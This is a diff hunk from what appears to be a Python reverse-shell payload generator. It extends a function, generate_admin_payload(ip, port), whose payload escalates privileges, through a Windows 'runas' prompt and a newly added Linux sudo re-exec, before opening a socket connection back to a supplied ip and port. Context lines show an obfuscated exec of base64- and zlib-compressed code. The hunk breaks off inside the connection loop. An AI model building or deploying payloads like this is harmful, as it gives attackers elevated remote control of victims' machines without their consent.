@@ -19,15 +19,28 @@ exec(zlib.decompress(base64.b64decode(d)),{{'s':s}})
     def generate_admin_payload(ip, port):
         payload = f"""import ctypes, sys
 def is_admin():
-    import ctypes, sys
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0
-    except Exception:
-        return False
+    import platform,ctypes,os
+    current_platform = platform.system().lower()
+
+    if current_platform == "windows":
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return False
+    elif current_platform == "linux":
+        return os.geteuid() == 0
+    return False
 
 if not is_admin():
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
-    sys.exit()
+    import platform,ctypes,os,sys
+    current_platform = platform.system().lower()
+
+    if current_platform == "windows":
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
+        sys.exit()
+    elif current_platform == "linux":
+        if os.execvp("sudo", ["sudo", "python3"] + sys.argv):
+            sys.exit()
 import socket,zlib,base64,struct,time
 for x in range(10):
     try:
